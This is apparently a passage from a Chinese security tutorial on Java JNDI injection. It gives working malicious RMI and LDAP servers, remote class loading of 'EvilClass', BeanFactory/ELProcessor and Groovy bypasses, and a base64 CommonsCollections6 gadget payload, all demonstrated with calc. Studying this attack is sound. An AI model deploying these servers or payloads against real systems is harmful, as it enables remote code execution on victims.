        SayHelloInterface sayhello = (SayHelloInterface) initialContext.lookup("rmi://127.0.0.1:1099/EvilClass");

    }
}
```

Reference 对象会先去本地查找对应的类是否存在，如果不存在，才会去 factoryLocation 指定的 URL 查找。故而为了体现出是远程加载，我将 EvilClass.class 文件放在其他目录下，再利用 python 开启 http 服务器（注意，此时客户端是不能直接访问到 EvilClass 类的）。

先开启 http 服务器，再开启 rmi 服务端，最后开启客户端，成功弹出计算器，并且 http 服务器上有对应的日志记录：

![](https://changeyourway.github.io/images/image-20240903205544943.png)

原理就是客户端去请求了 RMI 服务端地址，获取了 ReferenceWrapper 对象，然后又根据其中封装的 Reference 对象的 factoryLocation 属性去请求了远程对象所在的地址，最终造成客户端反序列化。

### JNDI + LDAP

LDAP 服务端需要设置好如下的四个属性，代表远程对象的引用：

```
ObjectClass: javaNamingReference
javaCodebase: http://localhost:5000/
JavaFactory: EvilClass
javaClassName: FooBar
```

这其实也是 Reference 类的一种利用方式。

我们利用 Java 开启一个 LDAP 服务器，需要的依赖如下：

```
<!-- UnboundID LDAP SDK -->
<dependency>
    <groupId>com.unboundid</groupId>
    <artifactId>unboundid-ldapsdk</artifactId>
    <version>6.0.7</version>
</dependency>
```

LDAP 服务端代码如下：

```
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

public class ldapServer {
    private static final String LDAP_BASE = "dc=example,dc=com";
    public static void main (String[] args) {
        String url = "http://127.0.0.1:8002/#EvilClass";
        int port = 10389;
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();
        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }
    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private URL codebase;
        /**
         * */ public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }
        /**
         * {@inheritDoc}
         * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */ @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }
        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaClassName", "Exploit");
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```

客户端代码如下：

```
import javax.naming.Context;
import javax.naming.InitialContext;

public class ldapClient {
    public static void main(String[] args) throws Exception {
        //初始化上下文
        Context initialContext = new InitialContext();
        //调用远程类
        initialContext.lookup("ldap://127.0.0.1:10389/EvilClass");

    }
}
```

同样确保客户端访问不到 EvilClass 类文件，是可以远程加载的。

## JDK 高版本绕过

### RMI 高版本绕过

在 JDK 8u121、7u131、6u141 版本之后，默认不信任远程代码，无法加载 RMI 远程对象。此时再运行上面 JNDI + RMI 的代码则会爆出如下错误：

![](https://changeyourway.github.io/images/image-20240904123125191.png)

需要添加以下参数才能成功运行：

```
com.sun.jndi.rmi.object.trustURLCodebase=true
```

那么我直接在客户端代码中设置系统属性：

```
System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
```

在 JDK 8u392 的环境中，运行后成功获取 RMI 远程对象，但是并没有去 Reference 指定的 URL 中获取远程对象，最终获取的是空值，所以也没有成功执行命令。

回到正题，JDK 高版本之后，原本用于实例化远程对象的 RegistryContext#decodeObject 现在多了一条判断机制：

![](https://changeyourway.github.io/images/image-20240904190359616.png)

也就是说想要成功实例化对象，要不就 Reference 对象为空，要不就 Reference 对象的 classFactoryLocation 属性为空，要不就系统属性 com.sun.jndi.rmi.object.trustURLCodebase 设置为 true 。

目前最好利用的是第二种情况，Reference 对象的 classFactoryLocation 属性为空，也就是说，RMI 服务端在绑定 Reference 对象时，不能够指定获取工厂类的远程地址，那么客户端就只能从本地获取工厂类。如果能从客户端加载合适的工厂类，依然可以达成目的。

#### BeanFactory 类

说到客户端本地的工厂类，org.apache.naming.factory.BeanFactory 是比较常用的工厂类之一，这个类存在于 Tomcat 8 环境中。

在测试环境下，为客户端添加如下依赖：

```
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-catalina</artifactId>
    <version>8.5.0</version>
</dependency>
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-jasper-el</artifactId>
    <version>8.5.0</version> <!-- 使用适合你的项目的Tomcat版本 -->
</dependency>
```

RMI 服务端代码如下：

```
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class TomcatRmiServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
        resourceRef.add(new StringRefAddr("forceString", "test=eval"));
        resourceRef.add(new StringRefAddr("test", "Runtime.getRuntime().exec(\"calc\")"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
        registry.bind("Tomcat8bypass", referenceWrapper);
        System.out.println("Registry运行中......");

    }
}
```

受害者客户端代码如下：

```
import javax.naming.InitialContext;

public class TomcatRmiClient {
    public static void main(String[]args) throws Exception{
        String string = "rmi://localhost:1099/Tomcat8bypass";
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(string);
    }
}
```

运行后成功弹出计算器。

接下来说一下服务端代码为什么这么写。

#### 原理分析

运行服务端代码，调试客户端代码。

在 JNDI 动态协议转换的调用链最后，我们来到了 NamingManager#getObjectInstance 方法，而在这个方法中最终会调用 BeanFactory 的 getObjectInstance 方法：

![](https://changeyourway.github.io/images/image-20240905180127975.png)

跟进 BeanFactory 的 getObjectInstance 方法：

![](https://changeyourway.github.io/images/image-20240905180447349.png)

首先就会判断传入的 obj 对象是否是 ResourceRef 类的实例，这就是服务端代码封装一个 ResourceRef 对象的原因。

接下来获取 ResourceRef 其中的 forceString 属性值，也就是 “test=eval” ，将等号作为分隔符分隔字符串，setterName 获取了等号右边的部分，也就是 eval ，而 param 获取了等号左边的部分 test 。最后将它们 put 进一个 HashMap 里面：

![](https://changeyourway.github.io/images/image-20240905180852100.png)

接下来就是遍历 ref 的所有属性，获取除了 scope、auth、forceString、singleton 以外的属性。这里获取到 test 属性，其值是 `Runtime.getRuntime().exec("calc")` ，也就是我们一开始设置的那个属性。

![](https://changeyourway.github.io/images/image-20240906124955341.png)

由于 HashMap 对象 forced 中存在键 test -> eval ，这里获取的 method 自然不为空，于是在这里就执行了 calc 命令：

![](https://changeyourway.github.io/images/image-20240906125300326.png)

在这里就可以看出：BeanFactory 这个类实际上允许执行任意类的任意方法，而服务端代码选用了 javax.el.ELProcessor 的 eval 方法，参数就是 Runtime.getRuntime().exec(“calc”) ，来命令执行。

#### Groovy

Groovy 是一种面向对象的动态脚本语言，运行在 Java 虚拟机 (JVM) 上，具备与 Java 无缝集成的特性。在 Groovy 中，@ASTTest 是一种用于抽象语法树（AST）测试的特殊注解。它允许我们在编译阶段对代码的 AST（Abstract Syntax Tree，抽象语法树）进行断言和检查。也就是说在生成字节码之前，可以通过 @ASTTest 下断言执行代码。

Groovy 中的 AST 是在编译过程中对代码结构的中间表示。编译器将源代码转换为 AST 后，再生成字节码。

利用方式还是用 BeanFactory 类调用 GroovyClassLoader 类的 parseClass 方法，执行一个 Groovy 脚本。

服务端代码如下：

```
package GroovyRmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import javax.naming.NamingException;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class GroovyRmiServer {

    public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef resourceRef = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        resourceRef.add(new StringRefAddr("forceString", "faster=parseClass"));
        String script = String.format("@groovy.transform.ASTTest(value={\nassert java.lang.Runtime.getRuntime().exec(\"%s\")\n})\ndef faster\n", "calc");
        resourceRef.add(new StringRefAddr("faster",script));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
        registry.bind("Groovy2bypass", referenceWrapper);
        System.out.println("Registry运行中......");
    }
}
```

### LDAP 高版本绕过

JDK 11.0.1、8u191、7u201、6u211 版本之后，默认禁用了远程类加载，需要将 `com.sun.jndi.ldap.object.trustURLCodebase` 设置为 true 才能解除限制，那么通过设置 codebase 远程加载的方式就显得有些鸡肋了。

#### 序列化存储

LDAP 除了通过类似 codebase 的方式存储远程对象的信息外，还可以直接存储对象的序列化数据，只需要设置以下两个属性即可：

```
javaSerializedData: aced00573…
javaClassName: Exploit
```

以 CC6 为例，我们先生成一段编码后的 CC6 的序列化数据，然后将其添加到 LDAP 的属性中。LDAP 服务端代码如下：

```
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Base64;

public class ldapServerSerialize {
    private static final String LDAP_BASE = "dc=example,dc=com";
    public static void main (String[] args) {
        String url = "http://127.0.0.1:8002/#EvilClass";
        int port = 10389;
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();
        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }
    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private URL codebase;
        /**
         * */ public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }
        /**
         * {@inheritDoc}
         * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */ @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }
        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            String base64Data = "rO0ABXNyABFqYXZhLnV0" +
                    "aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAA" +
                    "Ax3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5" +
                    "UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21h" +
                    "cHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADa2V5c3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZ" +
                    "WN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2Nv" +
                    "bW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmN" +
                    "vbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5" +
                    "zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3h" +
                    "wdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZA" +
                    "gAAeHAAAAAEc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdG" +
                    "FudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5" +
                    "SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVu" +
                    "Y3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL" +
                    "09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdA" +
                    "ASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHA" +
                    "AAAACdAAKZ2V0UnVudGltZXB0ABFnZXREZWNsYXJlZE1ldGhvZHVyABJbTGphdmEubGFuZy5DbGFzc" +
                    "zurFteuy81amQIAAHhwAAAAAnZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHZxAH4AHHN" +
                    "xAH4AE3VxAH4AGAAAAAJwcHQABmludm9rZXVxAH4AHAAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAA" +
                    "AAAAAAAAAAAeHB2cQB+ABhzcQB+ABN1cQB+ABgAAAABdAAEY2FsY3QABGV4ZWN1cQB+ABwAAAABcQB" +
                    "+AB9zcQB+AAA/QAAAAAAADHcIAAAAEAAAAAB4eHQABHRlc3R4";
            e.addAttribute("javaClassName", "Exploit");
            e.addAttribute("javaSerializedData", Base64.getDecoder().decode(base64Data));
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```

客户端代码不变，运行后依旧能成功命令执行。

这样的方式就不需要受害者去远程加载类，而只需要客户端本地有对应的依赖即可。

#### 原理分析

LDAP 对于 javaSerializedData 数据反序列化的地方在 com.sun.jndi.ldap.Obj#decodeObject(Attributes)，这部分不再分析。

## 参考文章

[JNDI 注入漏洞的前世今生](https://evilpan.com/2021/12/13/jndi-injection/)

[Java 反序列化之 JNDI 学习](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/)

[Java 安全学习 —— JNDI 注入](https://goodapple.top/archives/696)

[JNDI 重看](https://stoocea.github.io/post/JNDIRe0.html)
